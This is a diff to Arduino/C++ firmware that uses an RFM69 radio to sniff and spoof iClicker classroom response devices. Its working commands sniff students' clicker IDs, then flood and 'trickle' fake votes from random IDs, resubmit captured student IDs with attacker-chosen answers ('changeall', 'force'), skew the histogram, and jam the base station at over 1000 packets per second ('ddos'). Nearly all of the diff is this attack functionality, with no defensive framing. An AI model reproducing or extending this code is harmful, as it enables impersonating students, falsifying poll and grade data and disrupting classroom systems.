@@ -6,10 +6,23 @@
 #include "charUtils.h"
 #include "memory.h"
 #include "list.h"
+#include "hashtable.h"
 
 // iClicker channel id macro - useful for switch statements
 constexpr uint16_t _iid(char* c) {
 	return ((uint16_t)c[0]) << 8 | c[1];
+}
+
+// iClicker id macro
+uint32_t collapseId(uint8_t* id) {
+	// TODO: ignore last byte since it's dependant on first 3?
+	return id[0] << 24 | id[1] << 16 | id[2] << 8 | id[3];
+}
+void expandId(uint32_t id, uint8_t* ida) {
+	ida[0] = (id & 0xff000000) >> 24;
+	ida[1] = (id & 0x00ff0000) >> 16;
+	ida[2] = (id & 0x0000ff00) >> 8;
+	ida[3] =  id & 0x000000ff;
 }
 
 // Radio properties
@@ -27,12 +40,6 @@ iClickerChannel Channel = iClickerChannels::AA;
 // iClicker instance
 iClickerEmulator Clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);
 
-// Some iClicker id constants
-/*(()=>{let A = Math.floor(Math.random() * 0x100), B = Math.floor(Math.random() * 0x100),
-C = Math.floor(Math.random() * 0x100), D = A ^ B ^ C; return "{0x" + A.toString(16) + ", 0x" +
-B.toString(16) + ", 0x" + C.toString(16) + ", 0x" + D.toString(16) + "}";})();*/
-uint8_t DDOS_ID[4];
-
 // Buffer for incoming serial commands
 const int SerialBufLen = 100;
 char SerialBuf[SerialBufLen + 1];
@@ -42,14 +49,19 @@ const int UBufLen = 100;
 char UBuf[UBufLen + 1];
 
 // Database of iClicker ids belonging to other students
-list<long> clickerIdDatabase;
+// TODO implement later. Or just make the responses hashTable persist after reset and change answer
+// value.
+//list<long> clickerIdDatabase;
+
+iClickerAnswer Answers[] = { ANSWER_A, ANSWER_B, ANSWER_C, ANSWER_D, ANSWER_E };
 
 // Current poll status info
-// Store answers in array for quick access
-// Maintain hash map for unique IDs
-// TODO: Turn this into a hash map based on clicker id... people can submit more than once
+// Store number of each answer in array for quick access
 int poll[5];
 int nResponses;
+
+// Maintain hash map for unique IDs
+hashTable<char> responses(100); // Probably at most 300 responses? 100 should be a good size...
 
 // user id hash table size: 400
 // bogus hash size: 4000
@@ -59,20 +71,31 @@ void resetPoll() {
 	for(int i = 0; i < 5; i++)
 		poll[i] = 0;
 	nResponses = 0;
+	responses.clear();
 }
-void updatePoll(char a) {
-	if(a >= 'A' && a <= 'E') {
-		poll[a - 65]++;
+void updatePoll(uint8_t* id, char a) {
+	// Update the entry in the hash table and update local counters
+	tableEntry<char>* entry = responses.getEntry(collapseId(id));
+	if(entry == null) {
+		responses.set(collapseId(id), a);
 		nResponses++;
+	} else {
+		poll[entry->value - 65]--;
+		entry->value = a;
 	}
+	// We know a >= 'A' && a <= 'E'
+	poll[a - 65]++;
 }
 
 // Operation
-enum Operation { flood, changeall, bounce, eq, ddos, idle };
+enum Operation { flood, trickle, changeall, force, eq, ddos, idle };
 
 Operation operation = idle;
 char operationMode = null;
-int operationCounter; // Let operation keep track of its state
+// Let operation keep track of where it is...
+int operationCounter;
+int seqCounter;
+//void* operationState;
 
 // Program config
 #define MAX_BUFFERED_PACKETS 50
@@ -81,10 +104,63 @@ int operationCounter; // Let operation keep track of its state
 // Packet buffer for intercepted packets
 RingBufCPP<iClickerPacket, MAX_BUFFERED_PACKETS> RecvBuf;
 
+void printCommas(int n) {
+	if(n < 1000)
+		Serial.printf("%d", n);
+	else {
+		printCommas(n / 1000);
+		Serial.printf(",%03d", n % 1000);
+	}
+}
+
+void printFreeMemory() {
+	int f = freeMemory();
+	Serial.print("Free memory: ");
+	printCommas(f);
+	Serial.println(" bytes");
+}
+
+void printHelpMessage() {
+	Serial.println("┌ help             Prints this help message");
+	Serial.println("│ setchannel <ch>  Changes the operating channel");
+	Serial.println("│ status           Prints poll status");
+	Serial.println("│ reset            Resets current poll state");
+	Serial.println("│ abort            Cancels the current operation");
+	Serial.println("├──────────┤");
+	Serial.println("│ flood <mode>     Floods base station with mode in answer, random, uniform, "
+		"seq");
+	Serial.println("│ trickle <mode>   Slowly sends bogus answers with mode in answer, random, "
+		"uniform, seq");
+	Serial.println("│ changeall <ans>  Changes all submitted answers to the given answer (or "
+		"uniform)");
+	Serial.println("│ force <ans>      Quickly resubmits all incoming answers as ans");
+	Serial.println("│ bounce           Causes the bar plot to bounce");
+	Serial.println("│ ddos             Attempts to flood base station with more than 1000 "
+		"responses/sec");
+	Serial.println("└ eq               Evens out the histogram");
+}
+
+void recvPacketHandler(iClickerPacket *recvd) {
+	#if REPLY_TO_CLICKERS
+	// Send acknowledgement to clicker. Acting as a base station.
+	// It might make sense to move this to the loop, however it is important that the
+	// acknowledgement is sent quickly.
+	if (recvd->type == PACKET_ANSWER) {
+		Clicker.acknowledgeAnswer(&recvd->packet.answerPacket, true);
+		// restore the frequency back to AA and go back to promiscous mode
+		Clicker.setChannel(Channel);
+		Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
+	}
+	#endif
+	// Add packet to the buffer
+	RecvBuf.add(*recvd);
+}
+
 // Main code
 void setup() {
 	// Setup LED
 	pinMode(LED, OUTPUT);
+	digitalWrite(LED, HIGH);
 	// Setup Serial
 	Serial.begin(9600);
 	while (!Serial) ; // Wait for serial port to be available
@@ -96,25 +172,31 @@ void setup() {
 	// Setup clicker
 	Clicker.begin(Channel);
 	Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
-	delay(1000);
 	Serial.println("Started promiscouous.");
+	// Print help message
+	printHelpMessage();
 }
 
 void loop() {
 	// Blink led
 	//digitalWrite(LED, (LED_on = !LED_on) ? LOW : HIGH);
 
-	// Handle packets
+	// Process packets
 	char msg[50];
 	iClickerPacket r;
 	while (RecvBuf.pull(&r)) {
-		uint8_t *id = r.packet.answerPacket.id;
+		uint8_t* id = r.packet.answerPacket.id;
 		iClickerAnswer ans = r.packet.answerPacket.answer;
 		char answer = iClickerEmulator::answerChar(ans);
-		snprintf(msg, sizeof(msg), "[%c][%02X%02X%02X%02X]  %c", r.type == PACKET_ANSWER ? 'a' : 'r', id[0], id[1], id[2], id[3], answer);
+		snprintf(msg, sizeof(msg), "[%c][%02X%02X%02X%02X]  %c", r.type == PACKET_ANSWER ? 'a' :
+			'r', id[0], id[1], id[2], id[3], answer);
 		Serial.println(msg);
-		if(ans != iClickerAnswer::ANSWER_PING)
-			updatePoll(answer);
+		if(operation == force) {
+			Clicker.submitAnswer(id, Answers[operationMode - 'a']);
+			updatePoll(id, operationMode);
+			// Promiscuous still re-engaged later...
+		} else if(answer != 'P' && answer != 'X') // answer is in {'A', 'B', 'C', 'D', 'E', 'P', 'X'}
+			updatePoll(id, answer);
 	}
 
 	// Handle any serial commands
@@ -151,19 +233,7 @@ void loop() {
 			int cmdi = getFragment(SerialBuf, 0, UBuf);
 			// Handle command
 			if(cEquals(UBuf, "help")) {
-				// Print help message
-				Serial.println("== Commands ==");
-				Serial.println("help             Prints this help message");
-				Serial.println("setchannel <ch>  Changes the operating channel");
-				Serial.println("status           Prints poll status");
-				Serial.println("reset            Resets current poll state");
-				Serial.println("abort            Cancels the current operation");
-				Serial.println("--  --  --  --");
-				Serial.println("flood <mode>     Floods base station with mode in answer, random, uniform, seq");
-				Serial.println("changeall <ans>  Changes all submitted answers to the given answer (or uniform)");
-				Serial.println("bounce           Causes the bar plot to bounce");
-				Serial.println("ddos             Attempts to flood base station with more than 1000 responses/sec");
-				Serial.println("eq               Evens out the histogram");
+				printHelpMessage();
 			} else if(cEquals(UBuf, "setchannel")) {
 				// Load argument into UBuf
 				getFragment(SerialBuf, cmdi, UBuf);
@@ -246,82 +316,99 @@ void loop() {
 					Serial.println(poll[i]);
 				}
 				// Some system info
-				Serial.printf("Free memory: %'dk\n", freeMemory());
+				printFreeMemory();
+			} else if(cEquals(UBuf, "mapstatus")) {
+				// For debug purposes......
+				Serial.printf("nBins: %d\n", responses.getNBins());
+				list<tableEntry<char>*>* bins = responses.getBins();
+				int c = 0;
+				for(int i = 0, l = responses.getNBins(); i < l; i++) {
+					Serial.print(bins[i].getLength());
+					if(i == l - 1 || (c = (c + 1) % 20) == 0)
+						Serial.print("\n");
+					else
+						Serial.print(", ");
+				}
 			} else if(cEquals(UBuf, "reset")) {
+				Serial.println("Resetting poll");
 				// Reset poll status
 				resetPoll();
 				// Reset current operation? I guess why not...
 				operation = idle;
-				operationParam = null;
+				operationMode = null;
 			} else if(cEquals(UBuf, "abort")) {
+				Serial.println("Aborting current operation");
 				// Cancel current operation?
 				operation = idle;
-				operationParam = null;
+				operationMode = null;
 			} else if(cEquals(UBuf, "flood")) {
+				Serial.println("Starting flood");
 				// Extract parameter
 				getFragment(SerialBuf, cmdi, UBuf);
-				// Only really need to compare first char...
-				switch(UBuf[0]) {
-					case 'a':
-						break;
-					case 'b':
-						break;
-					case 'c':
-						break;
-					case 'd':
-						break;
-					case 'e':
-						break;
-					case 'r':
-						break;
-					case 'u':
-						break;
-					case 's':
-						break;
-					default:
-						Serial.print("Unknown flood mode \"");
-						Serial.print(UBuf);
-						Serial.println("\"");
-						break;
+				// Only really need to look at first char
+				if(UBuf[0] == 'a' || UBuf[0] == 'b' || UBuf[0] == 'c' || UBuf[0] == 'd' ||
+						UBuf[0] == 'e' || UBuf[0] == 'r' || UBuf[0] == 'u' || UBuf[0] == 's') {
+					operation = flood;
+					operationMode = UBuf[0];
+					seqCounter = 0;
+				} else {
+					Serial.print("[Error] Unknown flood mode \"");
+					Serial.print(UBuf);
+					Serial.println("\"");
 				}
-				// Set operation
-				operation = flood;
+			} else if(cEquals(UBuf, "trickle")) {
+				Serial.println("Starting trickle");
+				// Extract parameter
+				getFragment(SerialBuf, cmdi, UBuf);
+				// Only really need to look at first char
+				if(UBuf[0] == 'a' || UBuf[0] == 'b' || UBuf[0] == 'c' || UBuf[0] == 'd' ||
+						UBuf[0] == 'e' || UBuf[0] == 'r' || UBuf[0] == 'u' || UBuf[0] == 's') {
+					operation = flood;
+					operationMode = UBuf[0];
+					operationCounter = 0;
+					seqCounter = 0;
+				} else {
+					Serial.print("[Error] Unknown trickle mode \"");
+					Serial.print(UBuf);
+					Serial.println("\"");
+				}
 			} else if(cEquals(UBuf, "changeall")) {
+				Serial.println("Starting changeall");
 				// Extract parameter
 				getFragment(SerialBuf, cmdi, UBuf);
-				// Only really need to compare first char...
-				switch(UBuf[0]) {
-					case 'a':
-						break;
-					case 'b':
-						break;
-					case 'c':
-						break;
-					case 'd':
-						break;
-					case 'e':
-						break;
-					case 'u':
-						break;
-					default:
-						Serial.print("Unknown changeall mode \"");
-						Serial.print(UBuf);
-						Serial.println("\"");
-						break;
+				// Only really need to compare first char
+				if(UBuf[0] == 'a' || UBuf[0] == 'b' || UBuf[0] == 'c' || UBuf[0] == 'd' ||
+						UBuf[0] == 'e' || UBuf[0] == 'u') {
+					operation = changeall;
+					operationMode = UBuf[0];
+				} else {
+					Serial.print("[Error] Unknown changeall mode \"");
+					Serial.print(UBuf);
+					Serial.println("\"");
 				}
-				// Set operation
-				operation = changeall;
-			} else if(cEquals(UBuf, "bounce"))
-				// Set operation
-				operation = bounce;
-			else if(cEquals(UBuf, "ddos"))
+			} else if(cEquals(UBuf, "force")) {
+				Serial.println("Starting force");
+				// Extract parameter
+				getFragment(SerialBuf, cmdi, UBuf);
+				if(UBuf[0] == 'a' || UBuf[0] == 'b' || UBuf[0] == 'c' || UBuf[0] == 'd' ||
+						UBuf[0] == 'e') {
+					operation = force;
+					operationMode = UBuf[0];
+				} else {
+					Serial.print("[Error] Unknown flood mode \"");
+					Serial.print(UBuf);
+					Serial.println("\"");
+				}
+			} else if(cEquals(UBuf, "ddos")) {
+				Serial.println("Starting ddos");
 				// Set operation
 				operation = ddos;
-			else if(cEquals(UBuf, "eq"))
+			} else if(cEquals(UBuf, "eq")) {
+				Serial.println("Starting equalization");
 				// Set operation
 				operation = eq;
-			else {
-				Serial.print("Unknown command \"");
+			} else {
+				Serial.print("[Error] Unknown command \"");
 				Serial.print(UBuf);
 				Serial.println("\"");
 			}
@@ -334,44 +421,188 @@ void loop() {
 			case flood:
 				// Flood the base station with a ton of answers
 				// Not DDOS level, but a lot
-				// TODO: Support various speeds
+				// Send about 200 responses per second
+				// ~20 per loop
+				for(int i = 0; i < 20; i++) {
+					iClickerAnswer answer;
+					switch(operationMode) {
+						case 'a':
+							answer = ANSWER_A;
+							break;
+						case 'b':
+							answer = ANSWER_B;
+							break;
+						case 'c':
+							answer = ANSWER_C;
+							break;
+						case 'd':
+							answer = ANSWER_D;
+							break;
+						case 'e':
+							answer = ANSWER_E;
+							break;
+						case 'r':
+							answer = iClickerEmulator::randomAnswer();
+							break;
+						case 'u':
+							{ // creating variables will node a scope
+								int max = 0;
+								int maxAnsi;
+								for(int i = 0; i < 5; i++)
+									if(poll[i] >= max) {
+										max = poll[i];
+										maxAnsi = i;
+									}
+								iClickerAnswer maxAns = Answers[maxAnsi];
+								do
+									answer = iClickerEmulator::randomAnswer();
+								while(answer != maxAns);
+							}
+							break;
+						case 's':
+							answer = Answers[seqCounter];
+							seqCounter = (seqCounter + 1) % 5;
+							break;
+					}
+					uint8_t id[4];
+					iClickerEmulator::randomId(id);
+					Clicker.submitAnswer(id, answer);
+					updatePoll(id, answer);
+				}
+				break;
+			case trickle:
+				// Slowly sends bogus answers to base station
+				// Send about 5 per second
+				operationCounter++;
+				if(operationCounter %= 2) {
+					iClickerAnswer answer;
+					switch(operationMode) {
+						case 'a':
+							answer = ANSWER_A;
+							break;
+						case 'b':
+							answer = ANSWER_B;
+							break;
+						case 'c':
+							answer = ANSWER_C;
+							break;
+						case 'd':
+							answer = ANSWER_D;
+							break;
+						case 'e':
+							answer = ANSWER_E;
+							break;
+						case 'r':
+							answer = iClickerEmulator::randomAnswer();
+							break;
+						case 'u':
+							{ // creating variables will node a scope
+								int max = 0;
+								int maxAnsi;
+								for(int i = 0; i < 5; i++)
+									if(poll[i] >= max) {
+										max = poll[i];
+										maxAnsi = i;
+									}
+								iClickerAnswer maxAns = Answers[maxAnsi];
+								do
+									answer = iClickerEmulator::randomAnswer();
+								while(answer != maxAns);
+							}
+							break;
+						case 's':
+							answer = Answers[seqCounter];
+							seqCounter = (seqCounter + 1) % 5;
+							break;
+					}
+					uint8_t id[4];
+					iClickerEmulator::randomId(id);
+					Clicker.submitAnswer(id, answer);
+					updatePoll(id, answer);
+				}
 				break;
 			case changeall:
 				// Changes all answers to a given answer
 				// Changes both student IDs and fake IDs
-				break;
-			case bounce:
-				// Makes histogram bounce
-				// Uses all submitted IDs
-				// Not really a bounce, but moves all answers to A, then B, then C, ... ?? Or I could just make it bounce...
+				// Just do it all in one go. Hopefully don't miss too much in the process...
+				if(operationMode >= 'a' && operationMode <= 'e') {
+					iClickerAnswer answer = Answers[operationMode - 'a'];
+					list<int>* keys = responses.getKeys();
+					listNode<int>* node = keys->getHead();
+					int id;
+					uint8_t ida[4];
+					if(node != null)
+						do {
+							id = node->getContent();
+							expandId(id, ida);
+							Clicker.submitAnswer(ida, answer);
+							updatePoll(ida, operationMode);
+						} while(node = node->getNext());
+				} else {
+					// then uniform
+					int answer = 0;
+					list<int>* keys = responses.getKeys();
+					listNode<int>* node = keys->getHead();
+					int id;
+					uint8_t ida[4];
+					if(node != null)
+						do {
+							id = node->getContent();
+							expandId(id, ida);
+							Clicker.submitAnswer(ida, Answers[answer % 5]);
+							updatePoll(ida, iClickerEmulator::answerChar(Answers[answer % 5]));
+							answer++;
+						} while(node = node->getNext());
+				}
 				break;
 			case eq:
-				// Attempts to equalize histogram
+				{
+					// Attempts to equalize histogram using bogus answers
+					// About 160 responses per second max
+					int max = 0;
+					for(int i = 0; i < 5; i++)
+						if(poll[i] > max)
+							max = poll[i];
+					uint8_t id[4];
+					for(int i = 0; i < 4; i++)
+						for(int j = 0; j < 5; j++)
+							if(poll[j] < max) {
+								iClickerEmulator::randomId(id);
+								Clicker.submitAnswer(id, Answers[j]);
+								updatePoll(id, Answers[j]);
+							}
+				}
 				break;
 			case ddos:
-				// Attempts to flood base station with more than 1000 submissions per second
-				Serial.println("Starting ddos. Send any data over serial to abort.");
-				// Generate new random ID for ddos
-				iClickerEmulator::randomId(DDOS_ID);
-				int i;
-				while(!Serial.available()) { // Stop when input is received from serial
-					unsigned long start = micros();
-					i = 1000;
-					while(i--) {
-						// Send bogus packet
-						Clicker.submitAnswer(DDOS_ID, iClickerAnswer::ANSWER_A);
+				{
+					// Attempts to flood base station with more than 1000 submissions per second
+					Serial.println("Send any data over serial to abort.");
+					// Generate new random ID for ddos
+					uint8_t id[4];
+					iClickerEmulator::randomId(id);
+					int i;
+					while(!Serial.available()) { // Stop when input is received from serial
+						unsigned long start = micros();
+						i = 1000;
+						while(i--) {
+							// Send bogus packet
+							Clicker.submitAnswer(id, iClickerAnswer::ANSWER_A);
+						}
+						unsigned long end = micros();
+						// delta / 1000 = microseconds / packet = A
+						// 1000000 microseconds / A = packets per second?
+						Serial.println(1000000 / ((end - start) / 1000));
 					}
-					unsigned long end = micros();
-					// delta / 1000 = microseconds / packet = A
-					// 1000000 microseconds / A = packets per second?
-					Serial.println(1000000 / ((end - start) / 1000));
+					// we don't care about that input - clear it
+					while(Serial.available()) Serial.read();
+					// Inform user that ddos is finished
+					Serial.println("\nFinished ddos");
+					operation = idle;
+					updatePoll(id, 'a');
 				}
-				// we don't care about that input - clear it
-				while(Serial.available()) Serial.read();
-				// Inform user that ddos is finished
-				Serial.println("\nFinished ddos");
 				break;
 		}
+		// TODO: Book keeping of bogus answers
 		// All operations involve transmission. Promiscouous mode needs to be restarted.
 		Clicker.setChannel(Channel);
 		Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
@@ -379,20 +610,4 @@ void loop() {
 
 	// Pause for a little bit
 	delay(100);
-}
-
-void recvPacketHandler(iClickerPacket *recvd) {
-	#if REPLY_TO_CLICKERS
-	// Send acknowledgement to clicker. Acting as a base station.
-	// It might make sense to move this to the loop, however it is important that the
-	// acknowledgement is sent quickly.
-	if (recvd->type == PACKET_ANSWER) {
-		Clicker.acknowledgeAnswer(&recvd->packet.answerPacket, true);
-		// restore the frequency back to AA and go back to promiscous mode
-		Clicker.setChannel(Channel);
-		Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
-	}
-	#endif
-	// Add packet to the buffer
-	RecvBuf.add(*recvd);
 }
